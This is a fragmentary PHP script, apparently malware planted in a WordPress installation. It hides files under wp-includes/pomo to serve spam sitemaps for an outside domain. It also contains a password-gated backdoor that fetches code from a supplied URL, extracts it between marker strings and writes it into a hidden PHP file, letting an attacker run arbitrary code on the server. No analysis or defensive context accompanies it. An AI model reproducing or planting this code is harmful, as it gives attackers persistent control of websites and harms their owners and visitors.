...
$home="http://www.bootsaustralia.uk/";
...
$dir=str_replace("\wp-admin","",getcwd());
$data=$dir.'/wp-includes/pomo/ug-ustp.log';

if(strpos($url, "sitemapugustp")!== false && strpos($url, ".xml")!== false){
...
if($url=="sitemap"){
header("HTTP/1.1 200 OK");
$sitemap=$dir."/wp-includes/pomo/ugusindex.html";
$xmldata= file_get_contents($sitemap);
echo $xmldata;
die();
}
...
if($pass=="da4c6cd60e9b" && $url<>""){
	$reqw = get_data_yaugus($url);
	preg_match('#ugug(.*)usus#is', $reqw, $mtchs);
	$algo="tmp.php";
	@unlink(".$algo");
	$hdl = fopen(".$algo", 'w');
	fwrite($hdl, "<?php\n$mtchs[1]\n?>");
